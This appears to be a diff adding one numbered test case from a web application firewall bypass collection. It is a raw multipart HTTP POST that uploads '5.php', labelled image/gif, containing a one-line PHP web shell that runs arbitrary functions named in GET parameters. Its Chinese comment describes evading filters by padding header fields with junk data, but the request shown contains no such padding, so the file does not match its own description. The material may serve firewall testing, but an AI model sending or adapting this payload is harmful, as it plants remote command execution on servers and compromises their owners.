@@ -1,0 +1,20 @@
+# upload_bypass_畸形表单19
+# 在name,filename,Content-Disposition,boundary等等字段之间插入大量的垃圾数据造成溢出的方式进行绕过
+POST /?bid=hd_tag_m8mv26fm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26fm
+RM-PRO-Token: 190dc3cbc7d3579cb32b562fbc8cffaf
+RM-PRO-Time: 1742808618184
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=aabbxxyy
+
+--aabbxxyy
+Content-Disposition: form-data; name="upload_file"; filename="5.php"
+Content-Type: image/gif
+
+<?php $_GET[a]($_GET[b]);?>
+--aabbxxyy
+Content-Disposition: form-data; name="submit"
+
+上传
+--aabbxxyy--
